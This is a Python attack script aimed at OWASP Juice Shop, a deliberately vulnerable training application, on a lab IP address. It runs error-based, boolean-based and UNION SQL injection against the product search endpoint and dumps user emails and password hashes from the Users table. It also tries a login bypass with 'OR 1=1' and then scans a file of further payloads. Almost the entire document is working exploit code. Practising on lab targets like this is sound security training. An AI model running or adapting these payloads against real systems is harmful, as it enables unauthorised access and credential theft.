#!/usr/bin/env python3
# Juice Shop SQLi tester
# Usage: python3 juiceshop_sqli.py <target-url> [payload-list]
#   e.g. python3 juiceshop_sqli.py http://192.168.56.20:3000
#        python3 juiceshop_sqli.py http://192.168.56.20:3000 payloads.txt

import sys, json, re, urllib.parse, urllib.request, urllib.error

if len(sys.argv) < 2:
    print("usage: python3 juiceshop_sqli.py <target-url> [payload-list]"); raise SystemExit
TARGET = sys.argv[1].rstrip("/")
PAYLOADS = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"

def send(path, value, post=False):
    try:
        if post:
            data = json.dumps({"email": value, "password": "x"}).encode()
            req = urllib.request.Request(TARGET + path, data=data,
                  headers={"Content-Type": "application/json"}, method="POST")
        else:
            req = urllib.request.Request(TARGET + path + urllib.parse.quote(value, safe=""))
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception:
        return 0, ""

def err(body):
    return any(s in body.lower() for s in ("sqlite_error", "sequelizedatabaseerror", "unrecognized token"))

print(f"[*] target: {TARGET}\n")

# connection check
status, body = send("/rest/products/search?q=", "apple")
if status == 0:
    print("[!] can't reach target. Is Juice Shop up?"); raise SystemExit
print(f"[+] connected (HTTP {status})\n")

# 1) error-based
s, b = send("/rest/products/search?q=", "zzz'")
print("[+] error-based: injectable" if err(b) or s >= 500 else "[-] error-based: no")

# 2) boolean-based
_, t = send("/rest/products/search?q=", "zzz')) OR 1=1-- -")
_, f = send("/rest/products/search?q=", "zzz')) OR 1=2-- -")
print("[+] boolean-based: injectable" if t.count('"id"') > f.count('"id"') else "[-] boolean-based: no")

# 3) UNION + dump Users (9-column Products table)
_, d = send("/rest/products/search?q=",
            "zzz')) UNION SELECT id,email || '::' || password,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM Users-- -")
users = re.findall(r'"name":"([^"]*::[^"]*)"', d)
if users:
    print(f"[+] UNION: injectable. Users table ({len(users)} rows):")
    for u in users:
        e, _, p = u.partition("::")
        print(f"      {e:35} {p}")
else:
    print("[-] UNION: no rows")

# 4) login auth bypass
s, b = send("/rest/user/login", "' OR 1=1-- -", post=True)
print("[+] auth bypass: login works without a password" if s == 200 and "token" in b else "[-] auth bypass: no")

# 5) payload list
try:
    lines = [l.strip() for l in open(PAYLOADS) if l.strip() and not l.startswith("#")]
except FileNotFoundError:
    print(f"\n[!] payload list '{PAYLOADS}' not found; skipping scan"); lines = []
if lines:
    hits = 0
    print(f"\n[*] scanning {len(lines)} payloads from {PAYLOADS}")
    for p in lines:
        s, b = send("/rest/products/search?q=", p)
        if err(b) or s >= 500:
            hits += 1
            print(f"    HIT  {p}")
    print(f"[*] {hits}/{len(lines)} payloads triggered an error")
